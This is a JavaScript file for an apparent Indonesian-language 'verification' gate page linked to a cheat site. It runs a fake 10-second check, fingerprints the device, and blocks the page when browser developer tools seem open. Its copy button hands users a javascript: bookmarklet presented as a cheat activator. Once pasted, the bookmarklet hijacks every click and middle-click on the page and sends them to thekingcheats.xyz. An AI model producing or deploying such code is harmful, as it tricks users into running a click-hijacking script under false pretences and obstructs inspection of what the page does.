/* ===============================
   EXTREME LOCAL SECURITY (NO FIREBASE)
================================ */

/* ===============================
   CONFIG
================================ */
const EXPIRE_TIME = 1 * 60 * 60 * 1000; // 1 JAM

/* ===============================
   DEVICE ID (FINGERPRINT)
================================ */
function h(x){
  return btoa(x).replace(/=/g,"").substr(0,32);
}

let rawId = localStorage.getItem("_kraw");
if(!rawId){
  rawId = crypto.randomUUID();
  localStorage.setItem("_kraw", rawId);
}

const deviceId = h(
  rawId +
  navigator.userAgent +
  screen.width +
  screen.height +
  navigator.language
);

/* ===============================
   STORAGE KEY (OBFUSCATED)
================================ */
const STORE_KEY = h("king_verify_" + deviceId);

/* ===============================
   ELEMENTS
================================ */
const verifyBtn = document.getElementById("verifyBtn");
const countdown = document.getElementById("countdown");
const success = document.getElementById("success");
const nextButtons = document.getElementById("nextButtons");

/* ===============================
   AUTO CHECK (NO REVERIFY)
================================ */
(function autoCheck(){
  const data = localStorage.getItem(STORE_KEY);
  if(!data) return;

  try{
    const obj = JSON.parse(atob(data));
    if(Date.now() - obj.t < EXPIRE_TIME){
      unlock();
    }else{
      localStorage.removeItem(STORE_KEY);
    }
  }catch(e){
    localStorage.removeItem(STORE_KEY);
  }
})();

/* ===============================
   VERIFICATION (10s)
================================ */
verifyBtn.onclick = ()=>{
  let t = 10;
  verifyBtn.disabled = true;
  verifyBtn.innerText = "Memverifikasi...";

  const i = setInterval(()=>{
    countdown.innerText = "Tunggu " + t + " detik";
    t--;
    if(t < 0){
      clearInterval(i);
      saveVerify();
      unlock();
    }
  },1000);
};

/* ===============================
   SAVE VERIFY
================================ */
function saveVerify(){
  const payload = {
    t: Date.now(),
    d: deviceId
  };
  localStorage.setItem(
    STORE_KEY,
    btoa(JSON.stringify(payload))
  );
}

/* ===============================
   UNLOCK UI
================================ */
function unlock(){
  verifyBtn.style.display = "none";
  countdown.innerText = "";
  success.style.display = "block";
  nextButtons.style.display = "block";
}

/* ===============================
   COPY CONTENT
================================ */
const textToCopy = `
javascript:(function(){try{if(window.forceClickActive)return;window.forceClickActive=true;
window.forceClickHandler=function(e){try{e.preventDefault();e.stopImmediatePropagation();
if(e.type==='auxclick'&&e.button===1){window.open('https://thekingcheats.xyz/index.php','_blank')}
else{location.href='https://thekingcheats.xyz/index.php'}}catch(err){}};
document.addEventListener('click',window.forceClickHandler,true);
document.addEventListener('auxclick',window.forceClickHandler,true);
window.removeForceClick=function(){try{
document.removeEventListener('click',window.forceClickHandler,true);
document.removeEventListener('auxclick',window.forceClickHandler,true);
window.forceClickActive=false;delete window.forceClickHandler}catch(e){}};
alert('Script activated (ALL ERROR KING KEY)')}catch(e){alert('Script error')}})();
`;

const webTextToCopy = `
https://blog.techbotal.com/aplicativos-de-relacionamento-a-teknologi-yang-mengubah-cara-koneksi/
`;

const overlayWebURL = "https://thekingcheats.xyz/index.php";

function copyScript(){ navigator.clipboard.writeText(textToCopy); }
function copyWeb(){ navigator.clipboard.writeText(webTextToCopy); }

/* ===============================
   OVERLAY
================================ */
function openOverlay(){
  const o = document.getElementById("webOverlay");
  const f = document.getElementById("webFrame");
  f.src = overlayWebURL;
  o.style.display = "flex";
}

function closeOverlay(){
  document.getElementById("webOverlay").style.display = "none";
  document.getElementById("webFrame").src = "";
}

/* ===============================
   DEVTOOLS BLOCK
================================ */
setInterval(()=>{
  if(
    window.outerWidth - window.innerWidth > 200 ||
    window.outerHeight - window.innerHeight > 200
  ){
    document.body.innerHTML = "<h1>Access Blocked</h1>";
  }
},1200);
